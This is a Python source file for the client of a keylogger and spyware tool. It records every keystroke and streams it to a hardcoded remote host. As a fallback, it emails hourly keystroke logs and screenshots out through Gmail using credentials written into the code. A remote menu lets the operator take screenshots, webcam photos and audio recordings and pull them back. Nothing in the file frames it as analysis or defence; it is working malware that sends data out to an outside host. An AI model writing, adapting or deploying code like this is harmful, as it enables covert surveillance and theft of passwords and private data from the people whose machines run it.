import socket, zmq
import time
import getpass, os, platform, sys
from utils import *
from pynput.keyboard import Listener
from datetime import datetime
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


stop_threads = False
sys_name = platform.system().lower()

if sys_name == 'windows':
	temp_path = f"C:/Users/{getpass.getuser()}/AppData/Local/Temp/"
elif sys_name == 'linux' or sys_name == 'darwin':
	temp_path = "/tmp/"
else:
	sys.exit(1)

class Communication:
	def __init__(self, ip_address, port_stream, port_interact):
		self.ip_address = ip_address
		self.port_stream = port_stream
		self.port_interact = port_interact


	def connect2stream(self):
		self.stream_context = zmq.Context()
		self.socket_stream = self.stream_context.socket(zmq.PUB)
		self.socket_stream.connect('tcp://' + self.ip_address + ':' + str(self.port_stream))

		try:
			self.pc_ip = socket.gethostbyname(socket.gethostname())
		except socket.gaierror:
			try:
				self.pc_ip = socket.gethostbyname(socket.gethostname() + '.local')
			except:
				self.pc_ip = "Unknown"
		except:
			self.pc_ip = "Unknown"

		time.sleep(0.1)
		self.socket_stream.send_string('OK')


	def connect2interaction(self):
		self.interact_context = zmq.Context()
		self.socket_interact = self.interact_context.socket(zmq.REP)
		self.socket_interact.connect('tcp://' + self.ip_address + ':' + str(self.port_interact))


class KeyLoggerClient:
	def __init__(self, connection, email_address, email_password):
		self.email_address = email_address
		self.email_password = email_password
		self.smtp_alias = 'smtp.gmail.com'
		self.smtp_port = 587
		self.keys = None
		if isinstance(connection, Communication):
			self.connection = connection
		else:
			raise TypeError("\'connection\' parameter should be \'Communication\' type!")


	def on_release(self, key):
		self.keys = key


	def run(self):
		global stop_threads

		data = get_system_information(sys_name)
		data[1].append(self.connection.pc_ip)
		data = str(data)
		self.connection.socket_stream.send_string(data)

		keyboard_listener = Listener(on_release=self.on_release)
		keyboard_listener.start()

		while True:
			if self.keys is not None:
				date_time = get_time()
				key = str(self.keys).replace("'", "")
				data = ["chars", date_time, key]
				self.keys = None
				data = str(data)

				try:
					self.connection.socket_stream.send_string(data)
				except:
					stop_threads = True
					self.connection.socket_stream.close()
					self.connection.socket_interact.close()
					break

		stop_threads = True

		filename = 'log.csv'
		prev_hours = get_time()[13:15]

		while True:
			if self.keys is not None:
				date_time = get_time()
				key = str(self.keys).replace("'", "")
				data = [date_time, key]
				self.keys = None

				write_file(os.path.join(temp_path, filename), data)

			if get_time()[13:15] != prev_hours:
				prev_hours = get_time()[13:15]

				if os.path.isfile(os.path.join(temp_path, filename)):
					msg = MIMEMultipart()
					msg['From'] = self.email_address
					msg['To'] = self.email_address
					msg['Subject'] = 'Keylogger result'
					body = date_time
					msg.attach(MIMEText(body, 'plain'))
					file_attachment = MIMEBase('application', 'octet-stream')

					with open(os.path.join(temp_path, filename), 'rb') as handler:
						file_attachment.set_payload(handler.read())

					encoders.encode_base64(file_attachment)
					file_attachment.add_header('Content-Disposition', "attachment; filename=" + filename)
					msg.attach(file_attachment)

					if take_screenshot(temp_path):
						image_attachment = MIMEBase('application', 'octet-stream')

						with open(os.path.join(temp_path, "screenshot.png"), 'rb') as handler:
							image_attachment.set_payload(handler.read())

						encoders.encode_base64(image_attachment)
						image_attachment.add_header('Content-Disposition', "attachment; filename=screenshot.png")
						msg.attach(image_attachment)

					content = msg.as_string()

					with smtplib.SMTP(self.smtp_alias, self.smtp_port) as smtp_server:
						smtp_server.starttls()
						smtp_server.login(self.email_address, self.email_password)
						smtp_server.sendmail(self.email_address, self.email_address, content)

					if os.path.isfile(os.path.join(temp_path, filename)):
						os.remove(os.path.join(temp_path, filename))
					if os.path.isfile(os.path.join(temp_path, "screenshot.png")):
						os.remove(os.path.join(temp_path, "screenshot.png"))


class MenuHandlerClient(threading.Thread):
	def __init__(self, connection):
		super(MenuHandlerClient, self).__init__()
		if isinstance(connection, Communication):
			self.connection = connection
		else:
			raise TypeError("\'connection\' parameter should be \'Communication\' type!")


	def run(self):
		global stop_threads

		while True:
			try:
				option = self.connection.socket_interact.recv_string()
			except:
				break

			date_time = datetime.now().strftime("%d_%H_%M_%S")
			if option == '1':
				data = ["image", date_time]

				if take_screenshot(temp_path):
					if os.path.isfile(os.path.join(temp_path, "screenshot.png")):
						with open(os.path.join(temp_path, "screenshot.png"), 'rb') as handler:
							data.append(handler.read())
					else:
						data.append("Error")
				else:
					data.append("Error")

				try:
					self.connection.socket_interact.send_string(str(data))
				except:
					break
			elif option == '2':
				data = ["wcpic", date_time]

				if take_webcam_picture(temp_path):
					if os.path.isfile(os.path.join(temp_path, "wc_picture.png")):
						with open(os.path.join(temp_path, "wc_picture.png"), 'rb') as handler:
							data.append(handler.read())
					else:
						data.append("Error")
				else:
					data.append("Error")

				try:
					self.connection.socket_interact.send_string(str(data))
				except:
					break
			elif option == '3':
				data = ["audio", date_time]

				if record_audio(temp_path):
					if os.path.isfile(os.path.join(temp_path, "rec_audio.wav")):
						with open(os.path.join(temp_path, "rec_audio.wav"), 'rb') as handler:
							data.append(handler.read())
					else:
						data.append("Error")
				else:
					data.append("Error")

				try:
					self.connection.socket_interact.send_string(str(data))
				except:
					break
			elif option == '4' or stop_threads:
				data = ["close", date_time, "Exit"]
				self.connection.socket_stream.send_string(str(data))
				self.connection.socket_stream.close()
				self.connection.socket_interact.close()
				break


def main():
	global stop_threads

	communication = Communication(ip_address='mixr.3utilities.com', port_stream=10001, port_interact=10002)

	try:
		communication.connect2stream()
		communication.connect2interaction()

		menu_handler = MenuHandlerClient(connection=communication)
		menu_handler.start()

		key_logger = KeyLoggerClient(connection=communication, email_address='salamander.hck@gmail.com', email_password='0xzedff4343d2a')
		key_logger.run()
	except TypeError as err:
		sys.exit(1)
	except Exception as e:
		print(e)
		sys.exit(1)


if __name__ == '__main__':
	main()